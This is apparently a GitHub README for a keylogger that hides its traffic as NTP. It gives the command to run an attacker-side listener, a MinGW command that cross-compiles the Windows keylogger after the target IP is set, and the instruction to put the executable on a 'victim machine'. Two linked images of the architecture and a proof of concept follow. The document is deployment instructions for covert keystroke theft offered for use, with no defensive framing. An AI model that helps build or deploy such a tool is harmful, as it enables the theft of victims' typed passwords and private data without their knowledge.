# NTP Keylogger   
## Listener
```
rlwrap python ntpserver.py
```

## Victim
Change the IP to your desired target server IP adress 
```
x86_64-w64-mingw32-gcc jlogger.c -o jlogger.exe -lwsock32 -w
```
Then throw the exe on the victim machine

This is how exe works:


![arch](https://user-images.githubusercontent.com/45479002/205278255-a2782616-6b90-4a6a-af80-c329653c7889.png)


![poc_for_github](https://user-images.githubusercontent.com/45479002/205272116-fa17a9b3-2ba2-4f3b-8d4d-2c5ef19b8370.png)
